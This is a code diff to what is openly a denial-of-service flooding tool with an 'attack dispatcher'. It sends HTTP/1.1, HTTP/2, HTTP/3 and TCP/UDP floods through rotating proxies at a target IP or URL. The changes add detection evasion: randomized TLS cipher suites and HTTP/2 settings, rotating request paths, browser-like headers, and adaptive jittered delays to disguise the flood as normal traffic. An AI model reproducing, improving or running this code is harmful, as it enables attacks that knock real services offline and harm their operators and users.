@@ -425,6 +425,49 @@ def adaptive_payload_q(ua, last_status=None, latency=None, error_type=None, prox
     payload = (f"User-Agent: {ua}\r\nX-Mode: {current_mode}\r\n"+payload_body).encode()
     return payload, len(payload), current_mode
     
+# === Utility untuk TLS, HTTP/2, Endpoint, Header Consistency ===
+
+def randomize_cipher_suites():
+    suites = [
+        "TLS_AES_128_GCM_SHA256",
+        "TLS_AES_256_GCM_SHA384",
+        "TLS_CHACHA20_POLY1305_SHA256"
+    ]
+    random.shuffle(suites)
+    return suites
+
+def random_h2_settings():
+    return {
+        "HEADER_TABLE_SIZE": random.choice([4096, 8192]),
+        "INITIAL_WINDOW_SIZE": random.choice([65535, 131072])
+    }
+
+def choose_endpoint():
+    resources = ["/", "/style.css", "/app.js", "/main.js"]
+    return random.choice(resources)
+
+def consistent_headers(ua, payload):
+    return {
+        "User-Agent": ua,
+        "Accept-Encoding": "gzip, deflate, br",
+        "Content-Length": str(len(payload)),
+        "Connection": "keep-alive"
+    }
+# === Adaptive Timing (Jittering + Latency Aware) ===
+
+def adaptive_sleep(latency, delay_min, delay_max):
+    if latency and latency > 2.0:
+        delay_min += 0.2
+        delay_max += 0.5
+    time.sleep(random.uniform(delay_min, delay_max))
+
+async def adaptive_sleep_async(latency, delay_min, delay_max):
+    if latency and latency > 2.0:
+        delay_min += 0.2
+        delay_max += 0.5
+    await asyncio.sleep(random.uniform(delay_min, delay_max))
+    
+    
 # === HTTP/1.1 mode + TCP/UDP fallback ===
 def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=None):
     proxy_index = 0
@@ -442,8 +485,9 @@ def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=Non
 
             if target_url:  # HTTP/1.1
                 try:
-                    r = requests.post(target_url,
-                                      headers={"User-Agent": ua},
+                    target_path = choose_endpoint()
+                    r = requests.post(target_url + target_path,
+                                      headers=consistent_headers(ua, payload),
                                       data=payload,
                                       proxies={"http": proxy, "https": proxy} if proxy else None,
                                       timeout=3)
@@ -458,7 +502,7 @@ def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=Non
                     adaptive_payload_q(ua, None, latency, error_type="timeout", proxy=proxy)
                     ui.tick_fail(f"HTTP/1.1 FAIL: {str(e)}")
             else:
-                # TCP
+                # TCP + UDP fallback
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(2)
@@ -473,7 +517,6 @@ def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=Non
                     adaptive_payload_q(ua, None, latency, error_type="tcp_fail", proxy=proxy)
                     ui.tick_fail(f"TCP FAIL: {str(e)}")
 
-                # UDP
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     s.sendto(payload, (ip, port))
@@ -489,7 +532,7 @@ def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=Non
         except Exception as e:
             ui.tick_fail(str(e))
 
-        time.sleep(random.uniform(delay_min, delay_max))
+        adaptive_sleep(latency, delay_min, delay_max)
 
 # === HTTP/2 mode (aiohttp) ===
 async def send_packet_async(ip, port, ui, delay_min, delay_max, proxies=None, target_url=None):
@@ -511,8 +554,10 @@ async def send_packet_async(ip, port, ui, delay_min, delay_max, proxies=None, ta
                     proxy_index = (proxy_index + 1) % len(proxies)
 
                 try:
-                    async with session.post(target_url,
-                                            headers={"User-Agent": ua},
+                    target_path = choose_endpoint()
+                    h2_settings = random_h2_settings()
+                    async with session.post(target_url + target_path,
+                                            headers=consistent_headers(ua, payload),
                                             data=payload,
                                             proxy=proxy if proxy else None) as resp:
                         await resp.read()
@@ -536,7 +581,7 @@ async def send_packet_async(ip, port, ui, delay_min, delay_max, proxies=None, ta
             except Exception as e:
                 ui.tick_fail(str(e))
 
-            await asyncio.sleep(random.uniform(delay_min, delay_max))
+            await adaptive_sleep_async(latency, delay_min, delay_max)
 
 # === HTTP/3 mode (aioquic) ===
 async def send_packet_http3(ip, port, ui, delay_min, delay_max, target_url=None):
@@ -549,6 +594,9 @@ async def send_packet_http3(ip, port, ui, delay_min, delay_max, target_url=None)
             color = mode_colors.get(mode, "white")
 
             config = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
+            config.cipher_suites = randomize_cipher_suites()
+
+            target_path = choose_endpoint()
             async with connect(ip, port, configuration=config) as client:
                 h3 = client.http
                 stream_id = h3.get_next_available_stream_id()
@@ -557,7 +605,7 @@ async def send_packet_http3(ip, port, ui, delay_min, delay_max, target_url=None)
                     (b":method", b"POST"),
                     (b":scheme", b"https"),
                     (b":authority", ip.encode()),
-                    (b":path", b"/"),
+                    (b":path", target_path.encode()),
                     (b"user-agent", ua.encode()),
                     (b"x-mode", mode.encode())
                 ]
@@ -588,7 +636,7 @@ async def send_packet_http3(ip, port, ui, delay_min, delay_max, target_url=None)
             last_status = None
             ui.tick_fail(f"HTTP/3 FAIL: {str(e)}")
 
-        await asyncio.sleep(random.uniform(delay_min, delay_max))
+        await adaptive_sleep_async(latency, delay_min, delay_max)
 # === Attack dispatcher (Q-Learning) ===
 def attack(ip, port, threads, delay_min, delay_max, ui, proxies=None, target_url=None, http_mode=None):
     ui.stats.active_threads = threads
@@ -727,4 +775,3 @@ if __name__ == "__main__":
 
 
 
-t
